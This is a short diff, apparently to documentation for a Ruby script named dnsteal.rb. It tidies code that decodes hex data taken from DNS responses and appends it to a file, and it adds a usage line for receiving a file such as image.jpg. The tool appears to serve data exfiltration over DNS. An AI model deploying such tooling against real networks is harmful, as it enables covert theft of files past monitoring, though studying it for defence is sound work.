@@ -33,9 +33,9 @@ begin
     response = response[0].force_encoding("ISO-8859-1").encode("utf-8")
     data = response.match(/[a-f0-9]([a-f0-9]).*[a-f0-9]([a-f0-9])/i).to_s
     
-    # Write received data to file 
+    # Write received data to file
     File.open(file, 'a') do |d|
-      d.write [data].pack("H*") unless data == data_old
+      d.write [data].pack("H*") unless data == data_old     # Don't write the same data twice(poor workaround)
       puts data unless data == data_old
     end
     
@@ -47,7 +47,10 @@ rescue Exception => e
 end
 ```
 
-
+Run it 
+```
+ruby dnsteal.rb image.jpg
+```
 
 
 
